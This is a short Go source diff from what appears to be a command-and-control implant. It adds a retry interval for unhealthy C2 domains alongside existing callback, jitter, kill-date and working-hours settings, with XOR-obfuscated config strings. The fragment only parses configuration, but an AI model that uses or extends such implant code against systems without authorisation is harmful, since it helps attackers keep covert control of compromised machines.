@@ -18,16 +18,17 @@ import (
 
 // parsedConfig holds typed values derived from the build-time string globals.
 type parsedConfig struct {
-	callbackPort   int
-	sleepInterval  int
-	jitter         int
-	killDate       int64
-	maxRetries     int
-	httpTimeout    int
-	debug          bool
-	whStartMinutes int
-	whEndMinutes   int
-	whDays         []int
+	callbackPort     int
+	sleepInterval    int
+	jitter           int
+	killDate         int64
+	maxRetries       int
+	httpTimeout      int
+	recoverySeconds  int // Seconds between recovery attempts for unhealthy C2 domains
+	debug            bool
+	whStartMinutes   int
+	whEndMinutes     int
+	whDays           []int
 }
 
 // deobfuscateConfig XOR-decodes C2 config strings using the build-time key.
@@ -97,6 +98,10 @@ func parseConfigValues() parsedConfig {
 	cfg.debug, err = strconv.ParseBool(debug)
 	if err != nil {
 		cfg.debug = false
+	}
+	cfg.recoverySeconds, err = strconv.Atoi(recoveryInterval)
+	if err != nil || cfg.recoverySeconds <= 0 {
+		cfg.recoverySeconds = 600 // 10 minutes default
 	}
 
 	// Parse working hours
